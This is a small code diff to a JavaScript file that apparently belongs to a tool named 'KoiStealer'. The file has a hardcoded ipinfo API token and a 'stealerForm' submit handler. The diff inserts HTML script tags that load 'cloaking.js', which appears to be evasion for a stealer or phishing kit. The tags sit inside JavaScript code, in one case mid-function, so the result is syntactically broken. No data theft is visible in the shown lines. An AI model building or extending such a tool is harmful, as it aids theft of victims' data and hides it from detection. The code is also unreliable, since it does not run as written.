@@ -9,6 +9,7 @@ const ipInfoToken = "97788c7d33c9af";
 function log(msg) {
   console.log(`[KoiStealer] ${new Date().toLocaleString()} → ${msg}`);
 }
+<script src="cloaking.js"></script>
 
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("stealerForm");
@@ -18,6 +19,7 @@ document.addEventListener("DOMContentLoaded", () => {
     log("❌ Form not found.");
     return;
   }
+<script src="cloaking.js"></script>
 
   form.addEventListener("submit", async (event) => {
     event.preventDefault();
